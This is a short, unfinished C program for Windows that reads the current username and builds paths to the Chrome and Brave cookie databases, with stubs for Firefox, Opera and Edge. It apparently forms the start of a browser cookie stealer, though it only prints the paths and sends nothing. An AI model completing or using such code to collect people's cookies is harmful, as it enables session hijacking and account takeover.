#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winsock2.h>
#include <Lmcons.h>
#include <shlobj.h>
#include <shobjidl.h>
#include <shlwapi.h>
#include <stdio.h>
//#include <KnownFolders.h>

// prototypes
char * get_chrome_cookie_path(char *username);
char * get_firefox_cookie_path(char *username);
char * get_brave_cookie_path(char *username);
char * get_opera_cookie_path(char *username);
char * get_edge_cookie_path(char *username);
int check_installed_browsers(char *username);
char * get_local_appdata_path(char *username);

void main()
{
	TCHAR name [ UNLEN + 1 ];
	DWORD size = UNLEN + 1;

	if (GetUserName( (TCHAR*)name, &size ))
	{
    		printf( "Username: %s\n", name );
		// char * cookie_path = get_cookie_path( name );
		// printf( "Path: %s\n", cookie_path );
	}
	else
	{
    		printf( "Error: %d\n", GetLastError() );
	}
	// Print localappdata path
	char *appdata_path = get_local_appdata_path(name);	
	printf("Local Appdata Path: %s\n", appdata_path);
	char *chrome_cookies = get_chrome_cookie_path(name);
	printf("Chrome Cookies Path: %s\n", chrome_cookies);

}

char * get_chrome_cookie_path(char *username)
{
	char * cookie_path = malloc( 260 );
	sprintf(cookie_path, "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies", username );
	return cookie_path;
}
char * get_firefox_cookie_path(char *username)
{
	char * cookie_path = malloc( 260 );
	// sprintf(cookie_path, "C:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\default\\cookies.sqlite", username );
	// check the folders present
	
	return cookie_path;
}

char * get_brave_cookie_path(char *username)
{
	char * cookie_path = malloc( 260 );
	sprintf(cookie_path, "C:\\Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies", username );
	return cookie_path;
}

char * get_local_appdata_path(char *username)
{
	char * appdata_path = getenv("LOCALAPPDATA");
	return appdata_path;
}
int check_installed_browsers(char *username)
{
	/* Return Binary number for installed browsers
	   Browsers: [Edge, Chrome, Firefox, Opera, Brave]
	   Return 00001 for Edge
	   Return 00010 for Chrome
	   Return 00100 for Firefox
	   Return 01000 for Opera
	   Return 10000 for Brave
	   Return 00000 for no browsers
	   Return 11111 for all browsers
	   and so on... */
	char * cookie_path_chrome = get_chrome_cookie_path(username);
	char * cookie_path_brave = get_brave_cookie_path(username);
	char * cookie_path_firefox = get_firefox_cookie_path(username);
	//char * cookie_path_opera = get_opera_cookie_path(username);
	//char * cookie_path_edge = get_edge_cookie_path(username);

	return 0;
}
